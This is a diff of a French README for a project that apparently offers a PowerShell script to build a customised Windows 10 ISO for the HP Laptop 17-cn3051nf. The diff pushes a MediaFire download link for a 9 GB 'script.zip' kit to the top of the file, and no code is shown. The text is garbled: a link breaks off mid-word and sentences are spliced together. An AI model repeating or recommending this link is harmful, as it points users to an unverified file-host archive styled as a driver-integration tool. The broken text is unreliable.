@@ -1,5 +1,5 @@
-## Téléchargement https://www.mediafire.com/file/d8gejkqnpwjzhtz/script.zip/file
-Vous pouvez télécharger le kit complet (9 Go) ici : ](https://www.mediafiCe projet propose un script PowerShell automatisé pour créer une image ISO de Windows 10 personnalisée, spécifiquement optimisée pour le HP Laptop 17-cn3051nf.
+Vous pouvez télécharger le kit complet (9 Go) ici : ## Téléchargement https://www.mediafire.com/file/d8gejkqnpwjzhtz/script.zip/file
+ propose un script PowerShell automatisé pour créer une image ISO de Windows 10 personnalisée, spécifiquement optimisée pour le HP Laptop 17-cn3051nf.
 Pourquoi ce projet ?
 
 L'installation de Windows 10 sur ce modèle peut parfois nécessiter l'intégration manuelle de pilotes spécifiques pour que tout le matériel (Wi-Fi, touchpad, contrôleur de stockage, etc.) soit reconnu dès le premier démarrage. Ce script automatise l'ensemble du processus pour vous faire gagner du temps et éviter les erreurs de manipulation.
